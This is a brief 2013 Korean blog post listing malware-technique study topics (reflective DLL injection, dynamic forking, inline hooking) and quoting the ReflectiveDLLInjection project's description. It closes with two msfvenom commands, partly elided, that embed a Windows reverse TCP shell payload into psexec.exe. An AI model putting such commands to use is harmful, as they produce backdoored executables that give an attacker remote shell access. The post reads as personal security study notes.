---
layout: post
title: "Reflective DLL Injection"
date: 2013-08-29 13:00
comments: true
categories: 
---

손을 대야 할 것들이

* Reflective DLL injection
* Dynamic forking
* Inline hooking

[stephenfewer/ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)
을 읽고.

    Reflective DLL injection is a library injection technique in which the concept
    of reflective programming is employed to perform the loading of a library from
    memory into a host process.

Reflective programming 이라 함은, 

    In computer science, reflection is the ability of a computer program to
    examine and modify the structure and behavior (specifically the values,
    meta-data, properties and functions) of an object at runtime.

우선 Metasploit Patch

    msfvenom -p windows/shell_reverse_tcp -x psexec.exe ... The overwrite program entry method
    msfvenom -p windows/shell_reverse_tcp -x psexec.exe -k ... The aloocate and create thread and return to original program entry method (Keep)
